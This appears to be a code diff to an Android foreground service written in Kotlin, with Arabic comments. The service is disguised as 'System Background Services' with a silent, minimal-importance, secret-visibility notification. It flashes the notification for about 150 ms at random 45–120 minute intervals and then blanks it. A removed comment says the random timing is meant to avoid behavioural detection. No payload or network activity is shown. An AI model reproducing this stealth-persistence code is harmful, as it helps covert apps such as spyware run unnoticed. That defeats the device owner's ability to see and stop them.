@@ -49,8 +49,7 @@ class ForegroundService : Service() {
         startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
         isForeground = true
 
-        // جدولة نبضات شبحية بفترات متباعدة وعشوائية (45-120 دقيقة)
-        // لمحاكاة سلوك بشري وتجنب الكشف السلوكي
+        // جدولة نبضات شبحية بفترات متباعدة وعشوائية (45-120 دقيقة) لمحاكاة السلوك البشري
         scheduler.scheduleAtFixedRate({
             triggerPhantomPulse("Background Sync")
         }, Random.nextLong(45, 120), Random.nextLong(45, 120), TimeUnit.MINUTES)
@@ -64,7 +63,7 @@ class ForegroundService : Service() {
                 val channel = NotificationChannel(
                     CHANNEL_ID,
                     "System Background Services",
-                    NotificationManager.IMPORTANCE_MIN // أقل أهمية ممكنة
+                    NotificationManager.IMPORTANCE_MIN // أقل أهمية ممكنة (لا يظهر أيقونة في شريط الحالة)
                 ).apply {
                     description = "Core system operations"
                     setSound(null, null)
@@ -94,7 +93,7 @@ class ForegroundService : Service() {
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setSilent(true)
-            .setOngoing(true)   // مستمر لإبقاء الخدمة حية
+            .setOngoing(true)   // مستمر لإبقاء الخدمة حية 100%
             .setShowWhen(false)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(openPending)
@@ -103,14 +102,13 @@ class ForegroundService : Service() {
 
     private fun triggerPhantomPulse(actionType: String) {
         if (!isForeground) return
-        // إلغاء أي إخفاء مجدول سابق
         hideRunnable?.let { handler.removeCallbacks(it) }
 
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        // إظهار الإشعار لفترة خاطفة
+        // إظهار الإشعار لفترة خاطفة (150ms)
         nm.notify(NOTIFICATION_ID, buildGhostNotification("Processing $actionType..."))
 
-        // جدولة إخفاء الإشعار بعد أجزاء من الثانية
+        // جدولة إخفاء الإشعار (تحديث النص إلى فارغ) بعد أجزاء من الثانية
         hideRunnable = Runnable {
             if (isForeground) {
                 // تحديث الإشعار بنص فارغ (يختفي من الواجهة لكن الخدمة تبقى)
